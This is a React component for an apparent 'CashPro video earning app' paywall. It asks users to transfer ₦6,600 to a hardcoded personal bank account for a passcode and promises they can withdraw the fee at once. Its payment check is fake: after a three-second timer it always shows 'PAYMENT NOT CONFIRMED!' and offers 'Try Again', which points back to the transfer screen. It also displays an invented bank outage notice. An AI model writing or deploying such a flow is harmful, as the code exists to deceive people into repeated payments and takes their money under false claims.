"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { CheckCircle, Clock, Eye } from "lucide-react"

interface UserData {
  fullName: string
  email: string
  phone: string
  nationality: string
}

interface PaymentFlowProps {
  userData: UserData
  onComplete: () => void
}

type PaymentStep = "details" | "transfer" | "confirmation" | "payment-not-confirmed"

export function PaymentFlow({ userData, onComplete }: PaymentFlowProps) {
  const [currentStep, setCurrentStep] = useState<PaymentStep>("details")
  const [paymentData, setPaymentData] = useState({
    name: userData.fullName,
    phone: userData.phone,
    amount: "6600",
  })
  const [isProcessing, setIsProcessing] = useState(false)

  const handleDetailsSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setCurrentStep("transfer")
  }

  const handlePaymentMade = async () => {
    setIsProcessing(true)
    setCurrentStep("confirmation")

    await new Promise((resolve) => setTimeout(resolve, 3000))
    setCurrentStep("payment-not-confirmed")
    setIsProcessing(false)
  }

  const handleCopyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  if (currentStep === "details") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-background via-card to-primary/10">
        <Card className="w-full max-w-md shadow-2xl border-0 bg-card/90 backdrop-blur-sm">
          <CardHeader className="text-center space-y-4">
            <div className="mx-auto w-16 h-16 bg-gradient-to-br from-accent to-primary rounded-full flex items-center justify-center">
              <span className="text-xl font-bold text-accent-foreground font-serif">CP</span>
            </div>
            <CardTitle className="text-2xl font-serif">Buy Your Passcode</CardTitle>
            <p className="text-muted-foreground text-sm">
              Please provide your details, note that your passcode will be reviewed immediately your payment is
              completed
            </p>
          </CardHeader>

          <CardContent>
            <form onSubmit={handleDetailsSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="name">Name:</Label>
                <Input
                  id="name"
                  type="text"
                  value={paymentData.name}
                  onChange={(e) => setPaymentData((prev) => ({ ...prev, name: e.target.value }))}
                  className="h-12"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="phone">Number:</Label>
                <Input
                  id="phone"
                  type="tel"
                  value={paymentData.phone}
                  onChange={(e) => setPaymentData((prev) => ({ ...prev, phone: e.target.value }))}
                  className="h-12"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="amount">Amount:</Label>
                <Input id="amount" type="text" value={`₦${paymentData.amount}`} readOnly className="h-12 bg-muted" />
              </div>

              <Button
                type="submit"
                className="w-full h-12 bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white font-medium"
              >
                Submit
              </Button>

              <div className="text-center text-sm text-muted-foreground space-y-2">
                <p>
                  You have to make payment of ₦6,600 in order to be granted full access to the{" "}
                  <span className="font-semibold text-primary">CashPro</span> video earning app.
                </p>
                <p>Please note that you can withdraw back your ₦6,600 immediately you gain access to your dashboard.</p>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "transfer") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
        <Card className="w-full max-w-md shadow-2xl border-0">
          <CardHeader className="bg-gray-200 flex flex-row items-center justify-between p-4">
            <h2 className="text-lg font-semibold">Bank Transfer</h2>
            <Button variant="ghost" className="text-red-500 font-medium">
              Cancel
            </Button>
          </CardHeader>

          <CardContent className="p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold">MP</span>
                </div>
                <div>
                  <div className="text-right">
                    <div className="text-2xl font-bold">NGN 6,600</div>
                    <div className="text-sm text-muted-foreground">{userData.email}</div>
                  </div>
                </div>
              </div>
            </div>

            <div className="text-center py-4">
              <p className="text-lg">Proceed to your bank app to complete this Transfer</p>
            </div>

            <div className="bg-white rounded-lg p-4 border border-gray-200 space-y-4">
              {/* OPay Logo */}
              <div className="flex justify-center">
                <div className="w-16 h-16 bg-green-600 rounded-lg flex items-center justify-center">
                  <span className="text-white font-bold text-lg">OPay</span>
                </div>
              </div>

              {/* Service Down Heading */}
              <h3 className="text-xl font-bold text-red-600 text-center">Opay Service Down</h3>

              {/* Main Message */}
              <p className="text-center text-gray-700 font-medium">
                Please do not use Opay bank for payments at this time.
              </p>

              {/* Warning Box */}
              <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                <p className="text-red-700 text-center">
                  The Opay bank service is currently experiencing issues. Please use other supported banks for your
                  payment.
                </p>
              </div>

              {/* I Understand Button */}
              <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3">I Understand</Button>
            </div>

            <div className="bg-gray-50 rounded-lg p-4 space-y-4">
              <div className="flex justify-between items-center">
                <span className="font-medium">Amount</span>
                <div className="flex items-center gap-2">
                  <span className="font-bold">NGN 6,600</span>
                  <Button
                    size="sm"
                    className="bg-orange-400 hover:bg-orange-500 text-white px-3 py-1 text-xs"
                    onClick={() => handleCopyToClipboard("6600")}
                  >
                    Copy
                  </Button>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="font-medium">Account Number</span>
                <div className="flex items-center gap-2">
                  <span className="font-bold text-blue-600 underline">6066270617</span>
                  <Button
                    size="sm"
                    className="bg-orange-400 hover:bg-orange-500 text-white px-3 py-1 text-xs"
                    onClick={() => handleCopyToClipboard("6066270617")}
                  >
                    Copy
                  </Button>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="font-medium">Bank Name</span>
                <span className="font-bold">Moniepoint MFB</span>
              </div>

              <div className="flex justify-between items-center">
                <span className="font-medium">Account Name</span>
                <span className="font-bold">SILVER AMARACHI THEOPHILUS</span>
              </div>
            </div>

            <div className="bg-gray-50 rounded-lg p-4">
              <p className="text-sm text-center mb-4">Pay to this specific account and get your access code</p>
              <Button
                onClick={handlePaymentMade}
                className="w-full bg-orange-400 hover:bg-orange-500 text-white font-medium py-3"
              >
                I have made this bank transfer
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "confirmation") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
        <Card className="w-full max-w-md shadow-2xl border-0">
          <CardHeader className="bg-gray-200 flex flex-row items-center justify-between p-4">
            <h2 className="text-lg font-semibold">Bank Transfer</h2>
            <Button variant="ghost" className="text-red-500 font-medium">
              Cancel
            </Button>
          </CardHeader>

          <CardContent className="p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold">MP</span>
                </div>
              </div>
              <div className="text-right">
                <div className="text-2xl font-bold">NGN 6,600</div>
                <div className="text-sm text-muted-foreground">{userData.email}</div>
              </div>
            </div>

            <div className="text-center py-4">
              <p className="text-lg">Wait while we confirm your payment...</p>
            </div>

            <div className="space-y-3">
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <span>Payment Made</span>
                <CheckCircle className="w-5 h-5 text-green-500" />
              </div>

              <div className="flex items-center justify-between p-3 bg-orange-50 rounded-lg">
                <span>Confirming Payment</span>
                <Clock className="w-5 h-5 text-orange-500 animate-spin" />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "payment-not-confirmed") {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
        <Card className="w-full max-w-md shadow-2xl border-0">
          <CardHeader className="bg-gray-200 flex flex-row items-center justify-between p-4">
            <h2 className="text-lg font-semibold">Bank Transfer</h2>
            <Button variant="ghost" className="text-red-500 font-medium">
              Cancel
            </Button>
          </CardHeader>

          <CardContent className="p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold">MP</span>
                </div>
              </div>
              <div className="text-right">
                <div className="text-2xl font-bold">NGN 6,600</div>
                <div className="text-sm text-muted-foreground">{userData.email}</div>
              </div>
            </div>

            <div className="text-center py-4">
              <p className="text-lg">Proceed to your bank app to complete this Transfer</p>
            </div>

            <div className="flex flex-col items-center space-y-6">
              <div className="w-40 h-40 bg-red-500 rounded-full flex items-center justify-center shadow-lg">
                <svg className="w-20 h-20 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={4} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </div>

              <h3 className="text-2xl font-bold text-orange-500 text-center tracking-wide">PAYMENT NOT CONFIRMED!</h3>

              <p className="text-center text-gray-700 text-base px-4">
                Your payment wasn't confirmed. contact us on email for help
              </p>

              <div className="w-full relative">
                <Input
                  type="password"
                  value="•••••••••••••••••"
                  className="w-full h-14 text-center text-xl tracking-[0.5em] bg-white border-2 border-gray-300 rounded-lg pr-12"
                  readOnly
                />
                <Eye className="absolute right-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-500" />
              </div>

              <div className="w-full space-y-3 pt-4">
                <Button
                  onClick={() => setCurrentStep("transfer")}
                  className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium text-lg"
                >
                  Try Again
                </Button>
                <Button
                  onClick={onComplete}
                  variant="outline"
                  className="w-full h-12 border-2 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-lg bg-transparent"
                >
                  Return to Home
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return null
}
